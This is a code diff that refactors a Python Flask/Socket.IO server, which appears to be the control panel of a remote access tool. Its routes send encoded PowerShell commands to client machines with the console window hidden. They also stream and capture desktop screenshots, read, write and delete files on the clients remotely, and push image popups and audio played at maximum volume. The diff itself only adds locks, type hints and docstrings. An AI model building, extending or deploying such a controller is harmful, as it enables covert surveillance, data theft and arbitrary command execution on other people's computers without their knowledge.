@@ -1,3 +1,9 @@
+"""
+Run Backend Server - Flask & Socket.IO Central Controller
+Provides real-time bi-directional WebSocket messaging, REST APIs for client management,
+screenshot storage, remote command dispatch, remote file management (FTP), and activity logging.
+"""
+
 import os
 import re
 import uuid
@@ -8,32 +14,67 @@ import threading
 from datetime import datetime, timezone
 from contextlib import contextmanager
 from functools import wraps
+from typing import Any, Dict, List, Optional, Set, Tuple
 
-from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask import Flask, render_template, request, jsonify, send_from_directory, Response
 from flask_socketio import SocketIO, join_room
 from dotenv import load_dotenv
+
+# ── Environment & Application Configuration ──────────────────────────────────
 
 load_dotenv()
 
 app = Flask(__name__)
-# Auto-detect async mode (gevent / eventlet / threading) or allow override via env
-ASYNC_MODE = os.getenv("SOCKETIO_ASYNC_MODE", None)
+
+# Auto-detect async mode (gevent / eventlet / threading) or allow override via environment
+ASYNC_MODE: Optional[str] = os.getenv("SOCKETIO_ASYNC_MODE", None)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode=ASYNC_MODE)
 
-DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")
+DASHBOARD_PASSWORD: Optional[str] = os.getenv("DASHBOARD_PASSWORD")
 if not DASHBOARD_PASSWORD:
-    raise RuntimeError("DASHBOARD_PASSWORD is not set")
+    raise RuntimeError("DASHBOARD_PASSWORD environment variable is required but not set.")
 
-SCREENSHOT_DIR = "uploaded_frames"
+SCREENSHOT_DIR: str = "uploaded_frames"
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
-MAX_FRAMES_PER_USER = 1000
-upload_counters = {}
 
-SAFE_NAME_RE = re.compile(r"^[a-zA-Z0-9_\-\.]+$")
+MAX_FRAMES_PER_USER: int = 1000
+DATABASE_FILE: str = "database.db"
 
+# Regular expression to protect against path traversal and SQL injection in identifiers
+SAFE_NAME_RE: re.Pattern = re.compile(r"^[a-zA-Z0-9_\-\.]+$")
+
+# ── Thread-Safe In-Memory State & Synchronization Locks ─────────────────────
+
+# Lock for client tracking dictionaries
+client_lock = threading.Lock()
+active_clients: Dict[str, str] = {}  # Mapping: sid -> username
+authenticated_sids: Set[str] = set()  # Set of authenticated WebSocket session IDs
+
+# Lock for frame upload counters
+counter_lock = threading.Lock()
+upload_counters: Dict[str, int] = {}  # Mapping: username -> upload count
+
+# Lock for pending single-screenshot request events
+screenshot_lock = threading.Lock()
+pending_screenshot_requests: Dict[str, Dict[str, Any]] = {}  # Mapping: req_id -> {event, username, result}
+
+# Lock for pending file system (FTP) requests
+fs_lock = threading.Lock()
+pending_fs_requests: Dict[str, Dict[str, Any]] = {}  # Mapping: req_id -> {event, result}
+
+
+# ── Utility & Validation Helpers ─────────────────────────────────────────────
 
 def is_safe_name(name: str) -> bool:
-    """Validate that a username or filename does not contain path traversal characters."""
+    """
+    Validate that an identifier (username, filename, or token) is safe against path traversal.
+
+    Parameters:
+        name (str): The name or identifier string to validate.
+
+    Returns:
+        bool: True if the name contains only safe alphanumeric/hyphen/dot characters, False otherwise.
+    """
     if not name or not isinstance(name, str):
         return False
     if ".." in name or "/" in name or "\\" in name:
@@ -41,12 +82,26 @@ def is_safe_name(name: str) -> bool:
     return bool(SAFE_NAME_RE.match(name))
 
 
+# ── Database Layer & Context Manager ─────────────────────────────────────────
+
 @contextmanager
 def get_db():
-    """Context manager for thread-safe SQLite operations with automatic commit and rollback."""
-    conn = sqlite3.connect("database.db")
+    """
+    Context manager providing thread-safe SQLite database connections.
+    Enables WAL mode, enforces busy timeout, and performs automatic commit/rollback.
+
+    Yields:
+        sqlite3.Connection: An open SQLite connection with Row factory enabled.
+
+    Raises:
+        Exception: Re-raises any database exception encountered during the block.
+    """
+    conn = sqlite3.connect(DATABASE_FILE, timeout=20.0)
     conn.row_factory = sqlite3.Row
     try:
+        conn.execute("PRAGMA journal_mode=WAL;")
+        conn.execute("PRAGMA synchronous=NORMAL;")
+        conn.execute("PRAGMA busy_timeout=20000;")
         yield conn
         conn.commit()
     except Exception:
@@ -56,21 +111,12 @@ def get_db():
         conn.close()
 
 
-def require_password(f):
-    @wraps(f)
-    def wrapper(*args, **kwargs):
-        password = request.headers.get("x-password")
-        if not password or password != DASHBOARD_PASSWORD:
-            return jsonify({"detail": "Unauthorized"}), 401
-        return f(*args, **kwargs)
-
-    return wrapper
-
-
-def init_db():
-    """Initialize database tables with WAL mode for concurrent access."""
+def init_db() -> None:
+    """
+    Initialize SQLite database schema, creating required tables and performance indexes.
+    Sets up 'clients' table and 'operations_log' table with appropriate indexes.
+    """
     with get_db() as conn:
-        conn.execute("PRAGMA journal_mode=WAL;")
         conn.execute(
             """
             CREATE TABLE IF NOT EXISTS clients (
@@ -99,11 +145,20 @@ def init_db():
         )
 
 
+# Initialize schema on startup
 init_db()
 
 
-def log_operation(username: str, op_type: str, details: str, status: str = "success"):
-    """Record an operation in the database and broadcast to the dashboard in real-time."""
+def log_operation(username: str, op_type: str, details: str, status: str = "success") -> None:
+    """
+    Record an administrative or client operation in the database and broadcast to dashboard.
+
+    Parameters:
+        username (str): Target client username associated with the operation.
+        op_type (str): Category of operation (e.g., SYSTEM, COMMAND, SPEAK, SCREENSHOT, FTP).
+        details (str): Detailed description or payload summary of the event.
+        status (str): Operational outcome status (e.g., 'success', 'dispatched', 'online', 'offline').
+    """
     if not username or not is_safe_name(username):
         return
     try:
@@ -139,17 +194,91 @@ def log_operation(username: str, op_type: str, details: str, status: str = "succ
             room="dashboard",
         )
     except Exception as e:
-        print(f"[Log Error] {e}")
+        print(f"[Log Error] Failed to write operations log: {e}")
 
 
-# ── WebSockets Handlers ──
+# ── Security & Authentication Middleware ─────────────────────────────────────
 
-active_clients = {}
-authenticated_sids = set()
+def require_password(f):
+    """
+    Flask route decorator requiring a valid 'x-password' header matching DASHBOARD_PASSWORD.
 
+    Parameters:
+        f (Callable): Route handler function to wrap.
+
+    Returns:
+        Callable: Wrapped route function returning 401 Unauthorized if check fails.
+    """
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        password = request.headers.get("x-password")
+        if not password or password != DASHBOARD_PASSWORD:
+            return jsonify({"detail": "Unauthorized", "status": "error"}), 401
+        return f(*args, **kwargs)
+
+    return wrapper
+
+
+# ── Storage & Maintenance Subsystem ──────────────────────────────────────────
+
+def prune_old_frames(folder_path: str, max_keep: int = MAX_FRAMES_PER_USER) -> None:
+    """
+    Prune oldest screenshot files in a client folder to enforce quota and bounded disk usage.
+
+    Parameters:
+        folder_path (str): Absolute or relative filesystem path to user's screenshot folder.
+        max_keep (int): Maximum number of most recent frames to retain. Defaults to MAX_FRAMES_PER_USER.
+    """
+    try:
+        if not os.path.exists(folder_path):
+            return
+        files = [
+            f for f in os.listdir(folder_path)
+            if f.lower().endswith((".png", ".jpg", ".jpeg"))
+        ]
+        if len(files) > max_keep:
+            # Sort chronologically based on numeric timestamp prefix in filename
+            files.sort(key=lambda f: int("".join(filter(str.isdigit, f)) or "0"))
+            to_remove = files[: len(files) - max_keep]
+            for f in to_remove:
+                try:
+                    os.remove(os.path.join(folder_path, f))
+                except OSError:
+                    pass
+    except Exception as e:
+        print(f"[Prune Error] Error during frame pruning for {folder_path}: {e}")
+
+
+def _upsert_client_visibility(username: str, visible: int) -> None:
+    """
+    Helper function to insert or update the visibility state flag for a given client.
+
+    Parameters:
+        username (str): The target client username.
+        visible (int): 1 for visible console window, 0 for hidden.
+    """
+    with get_db() as conn:
+        conn.execute(
+            """
+            INSERT INTO clients (username, visible)
+            VALUES (?, ?)
+            ON CONFLICT(username) DO UPDATE SET
+                visible = excluded.visible
+            """,
+            (username, visible),
+        )
+
+
+# ── WebSocket Real-Time Event Handlers ───────────────────────────────────────
 
 @socketio.on("register_dashboard")
-def handle_register_dashboard(data):
+def handle_register_dashboard(data: Any) -> None:
+    """
+    Register an administrative browser dashboard session into the 'dashboard' broadcast room.
+
+    Parameters:
+        data (dict): Payload containing dashboard 'password' for authentication.
+    """
     if not isinstance(data, dict):
         return
     password = data.get("password")
@@ -159,7 +288,13 @@ def handle_register_dashboard(data):
 
 
 @socketio.on("register")
-def handle_register(data):
+def handle_register(data: Any) -> None:
+    """
+    Register an authenticated client daemon session, join user room, and update database.
+
+    Parameters:
+        data (dict): Payload containing 'username', 'auth_token', and 'version'.
+    """
     if not isinstance(data, dict):
         return
     username = data.get("username")
@@ -176,8 +311,10 @@ def handle_register(data):
     if not username or not is_safe_name(username):
         return
 
-    authenticated_sids.add(request.sid)
-    active_clients[request.sid] = username
+    with client_lock:
+        authenticated_sids.add(request.sid)
+        active_clients[request.sid] = username
+
     join_room(username)
 
     capture_val = False
@@ -209,10 +346,17 @@ def handle_register(data):
 
 
 @socketio.on("disconnect")
-def handle_disconnect():
-    authenticated_sids.discard(request.sid)
-    username = active_clients.pop(request.sid, None)
-    if username and username not in active_clients.values():
+def handle_disconnect() -> None:
+    """
+    Handle WebSocket client or dashboard disconnection, cleaning up session mappings
+    and notifying dashboard if a client has gone fully offline.
+    """
+    with client_lock:
+        authenticated_sids.discard(request.sid)
+        username = active_clients.pop(request.sid, None)
+        is_still_online = username in active_clients.values() if username else False
+
+    if username and not is_still_online:
         socketio.emit(
             "status_change", {"username": username, "online": False}, room="dashboard"
         )
@@ -220,12 +364,19 @@ def handle_disconnect():
 
 
 @socketio.on("heartbeat")
-def handle_heartbeat(data):
-    if request.sid not in authenticated_sids or not isinstance(data, dict):
-        return
-    username = data.get("username")
-    if not username or active_clients.get(request.sid) != username:
-        return
+def handle_heartbeat(data: Any) -> None:
+    """
+    Process periodic heartbeat ping from an authenticated client daemon and touch updated_at.
+
+    Parameters:
+        data (dict): Payload containing client 'username' and 'version'.
+    """
+    with client_lock:
+        if request.sid not in authenticated_sids or not isinstance(data, dict):
+            return
+        username = data.get("username")
+        if not username or active_clients.get(request.sid) != username:
+            return
 
     with get_db() as conn:
         conn.execute(
@@ -234,34 +385,22 @@ def handle_heartbeat(data):
         )
 
 
-def prune_old_frames(folder_path: str, max_keep: int = MAX_FRAMES_PER_USER):
-    """Prune oldest screenshot frames to keep storage clean and bounds checked."""
-    try:
-        if not os.path.exists(folder_path):
-            return
-        files = [
-            f for f in os.listdir(folder_path)
-            if f.lower().endswith((".png", ".jpg", ".jpeg"))
-        ]
-        if len(files) > max_keep:
-            files.sort(key=lambda f: int("".join(filter(str.isdigit, f)) or "0"))
-            to_remove = files[: len(files) - max_keep]
-            for f in to_remove:
-                try:
-                    os.remove(os.path.join(folder_path, f))
-                except OSError:
-                    pass
-    except Exception as e:
-        print(f"[Prune Error] {e}")
-
-
 @socketio.on("upload_frame")
-def handle_upload_frame(data):
-    if request.sid not in authenticated_sids or not isinstance(data, dict):
-        return
-    username = data.get("username")
-    if not username or active_clients.get(request.sid) != username:
-        return
+def handle_upload_frame(data: Any) -> None:
+    """
+    Receive uploaded desktop screenshot frame (JPEG/PNG bytes or base64) from client,
+    save to disk, broadcast event to dashboard, and notify any waiting single-shot promises.
+
+    Parameters:
+        data (dict): Payload containing 'username', 'filename', and 'image' bytes/string.
+    """
+    with client_lock:
+        if request.sid not in authenticated_sids or not isinstance(data, dict):
+            return
+        username = data.get("username")
+        if not username or active_clients.get(request.sid) != username:
+            return
+
     filename = data.get("filename")
     raw_img = data.get("image")
 
@@ -290,15 +429,18 @@ def handle_upload_frame(data):
             "new_frame", {"username": username, "filename": filename}, room="dashboard"
         )
 
-        # Notify any pending single-screenshot requests for this user
-        for req_id, entry in list(pending_screenshot_requests.items()):
-            if entry.get("username") == username and not entry["event"].is_set():
-                entry["result"] = {"success": True, "filename": filename}
-                entry["event"].set()
+        # Notify any pending single-screenshot requests waiting for this user
+        with screenshot_lock:
+            for req_id, entry in list(pending_screenshot_requests.items()):
+                if entry.get("username") == username and not entry["event"].is_set():
+                    entry["result"] = {"success": True, "filename": filename}
+                    entry["event"].set()
 
         # Periodically prune old frames asynchronously (every 50 frames)
-        count = upload_counters.get(username, 0) + 1
-        upload_counters[username] = count
+        with counter_lock:
+            count = upload_counters.get(username, 0) + 1
+            upload_counters[username] = count
+
         if count % 50 == 0:
             threading.Thread(
                 target=prune_old_frames,
@@ -306,28 +448,25 @@ def handle_upload_frame(data):
                 daemon=True,
             ).start()
     except Exception as e:
-        print(f"[Upload Frame Error] {e}")
-
-
-# ── Single Screenshot WebSocket Handlers ──
-
-pending_screenshot_requests = {}
+        print(f"[Upload Frame Error] Failed to persist frame: {e}")
 
 
 @socketio.on("capture_screenshot_res")
-def handle_screenshot_res(data):
+def handle_screenshot_res(data: Any) -> None:
+    """
+    Handle single screenshot capture result emitted back from client daemon.
+
+    Parameters:
+        data (dict): Payload containing 'req_id', 'filename', and optional 'error'.
+    """
     if not isinstance(data, dict):
         return
     req_id = data.get("req_id")
-    entry = pending_screenshot_requests.get(req_id)
-    if entry:
-        entry["result"] = data
-        entry["event"].set()
-
-
-# ── FTP / File Browser WebSocket Handlers ──
-
-pending_fs_requests = {}
+    with screenshot_lock:
+        entry = pending_screenshot_requests.get(req_id)
+        if entry:
+            entry["result"] = data
+            entry["event"].set()
 
 
 @socketio.on("fs_list_res")
@@ -336,27 +475,41 @@ pending_fs_requests = {}
 @socketio.on("fs_delete_res")
 @socketio.on("fs_mkdir_res")
 @socketio.on("fs_rename_res")
-def handle_fs_response(data):
+def handle_fs_response(data: Any) -> None:
+    """
+    Generic response dispatcher for remote file system / FTP actions.
+    Matches incoming response by 'req_id' and releases waiting HTTP thread.
+
+    Parameters:
+        data (dict): Payload containing 'req_id' and 'payload' data.
+    """
     if not isinstance(data, dict):
         return
     req_id = data.get("req_id")
-    entry = pending_fs_requests.get(req_id)
-    if entry:
-        entry["result"] = data.get("payload")
-        entry["event"].set()
+    with fs_lock:
+        entry = pending_fs_requests.get(req_id)
+        if entry:
+            entry["result"] = data.get("payload")
+            entry["event"].set()
 
 
-# ── REST API Routes ──
-
+# ── REST API Routes: Dashboard & Client Listing ──────────────────────────────
 
 @app.route("/")
-def index():
+def index() -> str:
+    """Render the primary HTML dashboard interface."""
     return render_template("index.html")
 
 
 @app.get("/api/clients")
 @require_password
-def get_clients():
+def get_clients() -> Response:
+    """
+    Fetch all registered client machines from the database, augmented with real-time online status.
+
+    Returns:
+        Response: JSON array of client metadata dictionaries.
+    """
     with get_db() as conn:
         rows = conn.execute(
             """
@@ -366,7 +519,8 @@ def get_clients():
             """
         ).fetchall()
 
-    online_usernames = set(active_clients.values())
+    with client_lock:
+        online_usernames = set(active_clients.values())
 
     return jsonify(
         [
@@ -383,11 +537,22 @@ def get_clients():
     )
 
 
+# ── REST API Routes: Screenshot Frames Management ────────────────────────────
+
 @app.get("/api/frames/<username>")
 @require_password
-def get_frames(username):
+def get_frames(username: str) -> Response:
+    """
+    Retrieve sorted list of stored screenshot filenames for a specific client.
+
+    Parameters:
+        username (str): Target client username.
+
+    Returns:
+        Response: JSON array of image filenames sorted numerically.
+    """
     if not is_safe_name(username):
-        return jsonify({"detail": "Invalid username"}), 400
+        return jsonify({"detail": "Invalid username", "status": "error"}), 400
 
     user_dir = os.path.join(SCREENSHOT_DIR, username)
     if not os.path.exists(user_dir):
@@ -407,7 +572,13 @@ def get_frames(username):
 
 @app.post("/api/frames/delete")
 @require_password
-def delete_frames():
+def delete_frames() -> Response:
+    """
+    Wipe all stored screenshot frames on disk for a specific client.
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
 
@@ -428,7 +599,13 @@ def delete_frames():
 
 @app.post("/api/capture")
 @require_password
-def set_capture():
+def set_capture() -> Response:
+    """
+    Toggle the continuous real-time screenshot stream flag on/off for a client.
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
     capture = data.get("capture")
@@ -461,14 +638,24 @@ def set_capture():
 
 @app.post("/api/screenshot/take")
 @require_password
-def take_screenshot():
+def take_screenshot() -> Response:
+    """
+    Dispatch an on-demand single desktop screenshot request to an online client,
+    blocking synchronously until captured or timed out (10s).
+
+    Returns:
+        Response: JSON response containing generated image filename and URL.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
 
     if not username or not is_safe_name(username):
         return jsonify({"status": "error", "message": "Missing or invalid username"}), 400
 
-    if username not in active_clients.values():
+    with client_lock:
+        is_online = username in active_clients.values()
+
+    if not is_online:
         return jsonify({"status": "error", "message": "Client is currently offline"}), 404
 
     with get_db() as conn:
@@ -480,7 +667,7 @@ def take_screenshot():
                 jsonify(
                     {
                         "status": "error",
-                        "message": "Cannot capture screenshot while Screenshot Stream is active.",
+                        "message": "Cannot capture single screenshot while Screenshot Stream is active.",
                     }
                 ),
                 400,
@@ -488,16 +675,18 @@ def take_screenshot():
 
     req_id = str(uuid.uuid4())
     event = threading.Event()
-    pending_screenshot_requests[req_id] = {
-        "event": event,
-        "username": username,
-        "result": None,
-    }
+    with screenshot_lock:
+        pending_screenshot_requests[req_id] = {
+            "event": event,
+            "username": username,
+            "result": None,
+        }
 
     socketio.emit("take_screenshot", {"req_id": req_id}, room=username)
 
     finished = event.wait(timeout=10)
-    entry = pending_screenshot_requests.pop(req_id, None)
+    with screenshot_lock:
+        entry = pending_screenshot_requests.pop(req_id, None)
 
     if not finished or not entry or not entry.get("result"):
         return jsonify({"status": "error", "message": "Screenshot capture timed out"}), 504
@@ -519,22 +708,38 @@ def take_screenshot():
     )
 
 
-def _upsert_client_visibility(username: str, visible: int):
-    with get_db() as conn:
-        conn.execute(
-            """
-            INSERT INTO clients (username, visible)
-            VALUES (?, ?)
-            ON CONFLICT(username) DO UPDATE SET
-                visible = excluded.visible
-            """,
-            (username, visible),
-        )
+@app.get("/frames/<username>/<filename>")
+def get_frame(username: str, filename: str) -> Response:
+    """
+    Serve a specific screenshot frame image file with immutable public cache headers.
 
+    Parameters:
+        username (str): Client username identifier.
+        filename (str): Image filename.
+
+    Returns:
+        Response: File data with HTTP cache headers.
+    """
+    if not is_safe_name(username) or not is_safe_name(filename):
+        return jsonify({"detail": "Invalid path", "status": "error"}), 400
+
+    user_dir = os.path.join(SCREENSHOT_DIR, username)
+    response = send_from_directory(user_dir, filename)
+    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
+    return response
+
+
+# ── REST API Routes: Command & Media Execution ───────────────────────────────
 
 @app.post("/api/visibility")
 @require_password
-def set_visibility():
+def set_visibility() -> Response:
+    """
+    Update target client console window visibility flag (1 = visible, 0 = hidden).
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
     visible = data.get("visible")
@@ -556,7 +761,14 @@ def set_visibility():
 
 @app.post("/api/command")
 @require_password
-def set_command():
+def set_command() -> Response:
+    """
+    Dispatch an encoded PowerShell / shell command to the connected client via WebSocket,
+    categorize the payload for the audit trail, and persist the operation log.
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
     cmd = data.get("cmd")
@@ -570,10 +782,10 @@ def set_command():
 
     _upsert_client_visibility(username, visible)
 
-    # Instant WebSocket push command to client!
+    # Push command payload immediately to client WebSocket room
     socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)
 
-    # Decode and categorize command for the operations log
+    # Decode and categorize command for the administrative audit log
     try:
         decoded = base64.b64decode(cmd).decode("utf-8", errors="replace").strip()
     except Exception:
@@ -592,7 +804,6 @@ def set_command():
             log_detail = decoded[4:].strip()
     elif "$pb.Image" in decoded or "Drawing.Image]::FromStream" in decoded:
         op_type = "IMAGER"
-        import re
         cap_match = re.search(r"\$caption\s*=\s*'([^']*)'", decoded)
         if cap_match and cap_match.group(1):
             log_detail = f"Image popup sent: {cap_match.group(1)}"
@@ -618,7 +829,13 @@ def set_command():
 
 @app.post("/api/image")
 @require_password
-def send_image():
+def send_image() -> Response:
+    """
+    Send an image dialog popup request with base64 image data to the target client.
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
     image_b64 = data.get("image")
@@ -630,10 +847,8 @@ def send_image():
     if not image_b64:
         return jsonify({"status": "error", "message": "Missing image data"}), 400
 
-    # Push to client room via WebSocket
     socketio.emit("display_image", {"image": image_b64, "caption": caption}, room=username)
 
-    # Log operation in database
     detail = f"Image popup sent: {caption}" if caption else "Dispatched image popup to client"
     log_operation(username, "IMAGER", detail, "dispatched")
 
@@ -642,7 +857,13 @@ def send_image():
 
 @app.post("/api/audio")
 @require_password
-def send_audio():
+def send_audio() -> Response:
+    """
+    Dispatch an audio clip playback request to play at maximum system volume on the client.
+
+    Returns:
+        Response: JSON status response.
+    """
     data = request.get_json(silent=True) or {}
     username = data.get("username")
     audio_b64 = data.get("audio")
@@ -655,33 +876,46 @@ def send_audio():
     if not audio_b64:
         return jsonify({"status": "error", "message": "Missing audio data"}), 400
 
-    # Push to client room via WebSocket
     socketio.emit(
         "play_audio",
         {"audio": audio_b64, "filename": filename, "title": title},
         room=username,
     )
 
-    # Log operation in database
     detail = f"Audio blast sent ({filename}): {title}" if title else f"Audio blast sent ({filename}) at max volume"
     log_operation(username, "AUDIO", detail, "dispatched")
 
     return jsonify({"status": "success", "message": "Audio sent over WebSocket"})
 
 
-# ── File System / FTP Browser Routes ──
+# ── REST API Routes: Remote File System (FTP) Browser ────────────────────────
 
+def dispatch_fs_request(username: str, event_name: str, payload: dict, timeout: int = 10) -> Response:
+    """
+    Dispatch a file system operation over WebSocket to an online client, waiting synchronously for the response.
 
-def dispatch_fs_request(username, event_name, payload, timeout=10):
+    Parameters:
+        username (str): Target client username.
+        event_name (str): WebSocket request event name (e.g., 'fs_list_req', 'fs_read_req').
+        payload (dict): Payload containing parameters such as paths and file contents.
+        timeout (int): Seconds to wait before returning a 504 Gateway Timeout.
+
+    Returns:
+        Response: Flask JSON response with operation result or error.
+    """
     if not username or not is_safe_name(username):
         return jsonify({"error": "Missing or invalid username"}), 400
 
-    if username not in active_clients.values():
+    with client_lock:
+        is_online = username in active_clients.values()
+
+    if not is_online:
         return jsonify({"error": "Client is currently offline"}), 404
 
     req_id = str(uuid.uuid4())
     event = threading.Event()
-    pending_fs_requests[req_id] = {"event": event, "result": None}
+    with fs_lock:
+        pending_fs_requests[req_id] = {"event": event, "result": None}
 
     req_payload = {"req_id": req_id, **payload}
     socketio.emit(event_name, req_payload, room=username)
@@ -699,16 +933,19 @@ def dispatch_fs_request(username, event_name, payload, timeout=10):
     log_operation(username, "FTP", f"{action_desc}: {target_path}")
 
     if event.wait(timeout=timeout):
-        res = pending_fs_requests.pop(req_id, {}).get("result")
+        with fs_lock:
+            res = pending_fs_requests.pop(req_id, {}).get("result")
         return jsonify(res or {"error": "No response payload"})
     else:
-        pending_fs_requests.pop(req_id, None)
+        with fs_lock:
+            pending_fs_requests.pop(req_id, None)
         return jsonify({"error": f"Request {event_name} timed out"}), 504
 
 
 @app.post("/api/fs/list")
 @require_password
-def fs_list():
+def fs_list() -> Response:
+    """List filesystem contents or available drives for a target client."""
     data = request.get_json(silent=True) or {}
     return dispatch_fs_request(
         data.get("username"),
@@ -720,7 +957,8 @@ def fs_list():
 
 @app.post("/api/fs/read")
 @require_password
-def fs_read():
+def fs_read() -> Response:
+    """Read file preview text or binary data from target client filesystem."""
     data = request.get_json(silent=True) or {}
     if not data.get("path"):
         return jsonify({"error": "Missing path parameter"}), 400
@@ -734,7 +972,8 @@ def fs_read():
 
 @app.post("/api/fs/write")
 @require_password
-def fs_write():
+def fs_write() -> Response:
+    """Write/save file contents to target client filesystem."""
     data = request.get_json(silent=True) or {}
     if not data.get("path"):
         return jsonify({"error": "Missing path parameter"}), 400
@@ -752,7 +991,8 @@ def fs_write():
 
 @app.post("/api/fs/delete")
 @require_password
-def fs_delete():
+def fs_delete() -> Response:
+    """Delete a file or directory from target client filesystem."""
     data = request.get_json(silent=True) or {}
     if not data.get("path"):
         return jsonify({"error": "Missing path parameter"}), 400
@@ -766,7 +1006,8 @@ def fs_delete():
 
 @app.post("/api/fs/mkdir")
 @require_password
-def fs_mkdir():
+def fs_mkdir() -> Response:
+    """Create a new directory on target client filesystem."""
     data = request.get_json(silent=True) or {}
     if not data.get("path"):
         return jsonify({"error": "Missing path parameter"}), 400
@@ -780,7 +1021,8 @@ def fs_mkdir():
 
 @app.post("/api/fs/rename")
 @require_password
-def fs_rename():
+def fs_rename() -> Response:
+    """Rename a file or folder on target client filesystem."""
     data = request.get_json(silent=True) or {}
     if not data.get("old_path") or not data.get("new_path"):
         return jsonify({"error": "Missing old_path or new_path parameter"}), 400
@@ -795,25 +1037,22 @@ def fs_rename():
     )
 
 
-@app.get("/frames/<username>/<filename>")
-def get_frame(username, filename):
-    if not is_safe_name(username) or not is_safe_name(filename):
-        return jsonify({"detail": "Invalid path"}), 400
-
-    user_dir = os.path.join(SCREENSHOT_DIR, username)
-    response = send_from_directory(user_dir, filename)
-    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
-    return response
-
-
-# ── Operations Log Routes ──
-
+# ── REST API Routes: Operations Audit Logging ────────────────────────────────
 
 @app.get("/api/logs/<username>")
 @require_password
-def get_user_logs(username):
+def get_user_logs(username: str) -> Response:
+    """
+    Fetch chronological audit logs of all actions performed on/by a specific client.
+
+    Parameters:
+        username (str): Target client username.
+
+    Returns:
+        Response: JSON array of log records.
+    """
     if not is_safe_name(username):
-        return jsonify({"detail": "Invalid username"}), 400
+        return jsonify({"detail": "Invalid username", "status": "error"}), 400
 
     limit = request.args.get("limit", 200, type=int)
     limit = min(max(1, limit), 500)
@@ -847,9 +1086,18 @@ def get_user_logs(username):
 
 @app.post("/api/logs/<username>/clear")
 @require_password
-def clear_user_logs(username):
+def clear_user_logs(username: str) -> Response:
+    """
+    Clear all recorded operations audit logs for a specific client.
+
+    Parameters:
+        username (str): Target client username.
+
+    Returns:
+        Response: JSON status response.
+    """
     if not is_safe_name(username):
-        return jsonify({"detail": "Invalid username"}), 400
+        return jsonify({"detail": "Invalid username", "status": "error"}), 400
 
     with get_db() as conn:
         conn.execute("DELETE FROM operations_log WHERE username = ?", (username,))
@@ -857,6 +1105,8 @@ def clear_user_logs(username):
     log_operation(username, "SYSTEM", "Operation logs cleared by administrator")
     return jsonify({"status": "success"})
 
+
+# ── Application Entry Point ──────────────────────────────────────────────────
 
 if __name__ == "__main__":
     socketio.run(app, host="0.0.0.0", port=5002, debug=False)
